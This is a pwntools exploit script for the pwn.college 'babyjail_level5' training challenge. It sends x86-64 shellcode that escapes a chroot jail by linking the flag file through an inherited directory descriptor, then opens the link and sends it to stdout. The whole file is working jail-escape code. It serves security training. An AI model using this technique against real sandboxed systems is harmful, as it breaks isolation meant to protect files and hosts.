from pwn import *
e=context.binary=ELF("./babyjail_level5")
if args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    s.checksec(0)
    p=s.process(["/challenge/babyjail_level5","/"])
if args.LOCAL:
    p=e.process(argv=["/"])
if args.GDB:
    gdb.attach(p,gdbscript="""
    b *main+1498
    """)
context.log_level='debug'
pause()
p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin")
shellcode=asm("""
xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rax, rax
mov rax, 0x6f616d6c2f
push rax
push rsp

xor r8, r8 
mov r10,  [RSP + 0] 
xor rdx, rdx 
mov rsi, [RSP + 16] 
mov rdi, 0x3
mov rax, 0x109
syscall
add RSP, 32

xor rax, rax
mov eax, 0x6f616d6c
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x2
syscall
add RSP, 16

mov r10, 0x40
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall

mov rax,60
syscall
""")
p.sendline(shellcode)
p.interactive()